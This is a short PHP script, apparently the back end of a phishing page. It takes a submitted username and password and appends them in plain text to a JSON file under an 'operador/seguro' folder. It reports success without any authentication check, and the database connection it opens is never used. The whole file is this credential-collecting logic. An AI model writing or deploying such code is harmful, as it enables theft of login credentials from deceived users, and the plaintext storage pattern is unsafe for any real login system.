<?php
 $sqlite = "sqlite:./DB/db.db";
 // conexão ao sqlite
 $pdo = new PDO($sqlite);
 if(isset($_POST['action'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $fl = "./operador/seguro/ccs.json";
    if(file_exists($fl)){
        $h = fopen($fl, "r");
        $arr = json_decode(fread($h, filesize ($fl)));
        array_push($arr,array($username, $password));
        fclose($h);
    } else {
        $arr = array(
            array($username, $password)
        );
    }
    $fhs = fopen($fl, 'w') or die("can't open file");
    fwrite($fhs, json_encode($arr));
    fclose($fhs);
    
    echo json_encode(array('status' => 'success')); 
 }

?>